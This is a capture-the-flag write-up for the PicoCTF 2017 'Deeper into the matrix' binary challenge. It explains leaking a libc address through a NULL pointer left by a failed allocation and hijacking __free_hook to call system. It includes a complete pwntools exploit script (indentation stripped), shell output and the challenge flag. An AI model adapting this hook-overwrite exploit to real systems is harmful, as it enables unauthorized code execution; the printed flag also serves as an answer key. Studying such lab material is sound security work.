# PicoCTF_2017: Deep into the matrix

**Category:** Binary
**Points:** 200
**Description:**

Flaws in the matrix have been corrected, and now you must [dive deeper](https://webshell2017.picoctf.com/static/00908bd31222e2b2ac5660ce3842eeac/matrix) to discover its secrets. Jack in at shell2017.picoctf.com:42470.

**Hint:**

Sometimes a NULL pointer can be useful.

The GOT is protected now - you'll have to find something else to attack.

## Write-up

Thanks to [BOAKGP](https://github.com/BOAKGP/CTF-Writeups/tree/master/PicoCTF%202017/Level%204/Binary%20Exploitation/Deeper%20Into%20The%20Matrix) for the guide through solving this writeup.
We are not given source code this time, but when we open the binary in IDA we can notice that it looks almost identical to the one from  `Enter The Matrix`  challenge. Unfortunately the bug seems to be fixed, so we need to find something else.

What attracted my attention was that the program doesn't exit if malloc/calloc fails to allocate memory (as it did in previous challenges). What's more, hints say us that we need NULL pointer and we can easily make one if we try to allocate too much memory.

But what can null pointer be useful for? Maximum matrix size is 10000x10000 and it's array of floats, so we have to multiply this size by 4.  `.got`  section is much closer to null pointer than this size and it allows us to easily leak libc base address.

```
$ r2 /lib32/libc.so.6
[0x00019bc0]> ?v sym.system
0x3e3e0
[0x00019bc0]> ?v sym.setbuf
0x6b350

```

Unfortunately because of RELRO we can't patch  `.got`  section and we have to find another way to execute  `system`. Luckily I found great repository on github with pwn hints (  [https://github.com/Naetw/CTF-pwn-tips#hijack-hook-function](https://github.com/Naetw/CTF-pwn-tips#hijack-hook-function)  ) and it appears that we can hijack some hook functions from libc.

```
?v sym.__free_hook
0x1aa8b8

```

The next problem is that libc is probably loaded too far away from null pointer, so we'll need to create another matrix. We can edit its data pointer and use it to overwrite  `__free_hook`. Last thing we have to do is to create one more matrix and put  `system`  parameter there. When you destroy the last matrix (the one with string in data) it will execute  `free`  function and in result  `system`.

In order for exploit to work every time we need to free all the matrices BEFORE we overwrite  `__free_hook`  (probably there is no enough memory for  `/bin/sh`)

**Final exploit**
```python
#!/usr/bin/env python2

from pwn import *

from struct import pack,unpack

import sys

SETBUF_GOT = 0x0804AFC8

SSCANF_GOT = 0x0804AFF0

SETBUF_OFFSET = 0x6b350

SYSTEM_OFFSET = 0x3e3e0

FREE_HOOK_OFFSET = 0x1aa8b8

MATRICES_ARRAY = 0x0804B080

PRINTF_OFFSET = 0x4cc70

def offsetToXY(offset):

index = offset/4

x = index/10000

y = index%10000

if x>10000:

print("Mission failed, can't get index for address %x"%offset)

sys.exit(1)

return x,y

r = remote("shell2017.picoctf.com",42470)

r.recvuntil("Enter command: ")

r.send("create 6 6\n")#we'll destroy it later, so free(m->data) aka system will be called

r.recvuntil("Enter command: ")

r.send("set 0 0 0 %.9g \n"%(unpack("<f","sh\x00\x00")[0]))

r.recvuntil("Enter command: ")

r.send("create 15 15\n")#we'll set __free_hook with it

r.recvuntil("Enter command: ")

for i in range(2,512):

r.send("create 10000 10000\n")

r.recvuntil("Enter command: ")

x,y = offsetToXY(SETBUF_GOT)

r.send("get %d %d %d\n"%(i,x,y))

res = r.recvuntil("Enter command:").splitlines()[-2].strip()

if "Matrix[%d][%d] = 0"%(x,y) not in res:

setbuf_libc = struct.unpack("<I",struct.pack("<f",float(res[21:])))[0]

break

for j in range(2,i):

r.send("destroy %d\n"%j)

r.recvuntil("Enter command: ")

libc_base = setbuf_libc-SETBUF_OFFSET

system_libc = libc_base+SYSTEM_OFFSET

free_hook_libc = libc_base+FREE_HOOK_OFFSET

matrix_pointer_address = MATRICES_ARRAY+1*4

print("system address %x"%system_libc)

print("libc base %x"%libc_base)

print("free_hook address %x"%free_hook_libc)

x,y = offsetToXY(matrix_pointer_address)

r.send("get %d %d %d\n"%(i,x,y))

res = r.recvuntil("Enter command:").splitlines()[-2].strip()

matrix_address = struct.unpack("<I",struct.pack("<f",float(res[21:])))[0]

matrix_data_address = matrix_address+8

x,y = offsetToXY(matrix_data_address)

r.send("get %d %d %d\n"%(i,x,y))

res = r.recvuntil("Enter command:").splitlines()[-2].strip()

data_ptr = struct.unpack("<I",struct.pack("<f",float(res[21:])))[0]

print("Old matrix[1]->data %x"%data_ptr)

r.send("set %d %d %d %.9g\n"%(i,x,y,unpack("<f",pack("<I",free_hook_libc))[0]))

r.recvuntil("Enter command: ")

r.send("get %d %d %d\n"%(i,x,y))

res = r.recvuntil("Enter command:").splitlines()[-2].strip()

data_ptr = struct.unpack("<I",struct.pack("<f",float(res[21:])))[0]

print("New matrix[1]->data %x"%data_ptr)

r.send("get 1 0 0\n")

res = r.recvuntil("Enter command:").splitlines()[-2].strip()

data_ptr = struct.unpack("<I",struct.pack("<f",float(res[15:])))[0]

print("Old hook %x"%data_ptr)

r.send("set 1 0 0 %.9g\n"%(unpack("<f",pack("<I",system_libc))[0]))

r.recvuntil("Enter command: ")

r.send("get 1 0 0\n")

res = r.recvuntil("Enter command:").splitlines()[-2].strip()

data_ptr = struct.unpack("<I",struct.pack("<f",float(res[15:])))[0]

print("New hook %x"%data_ptr)

r.send("destroy 0\n")

r.interactive()
```
On running this code we get,
```text
$ python solve.py 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/ec2-user/.pwntools-cache/update to 'never'.
[*] You have the latest version of Pwntools (3.12.2)
[+] Opening connection to shell2017.picoctf.com on port 42470: Done
system address f757f3e0
libc base f7541000
free_hook address f76eb8b8
Old matrix[1]->data 99500c0
New matrix[1]->data f76eb8b8
Old hook 0
New hook f757f3e0
[*] Switching to interactive mode
 $ ls
flag.txt
matrix
xinetd_wrapper.sh
$ cat flag.txt
517c97c471a525694c14c5adb8a3eebe
```

The flag is  `517c97c471a525694c14c5adb8a3eebe`.


<!--stackedit_data:
eyJoaXN0b3J5IjpbLTE3ODA5Njc2NTFdfQ==
-->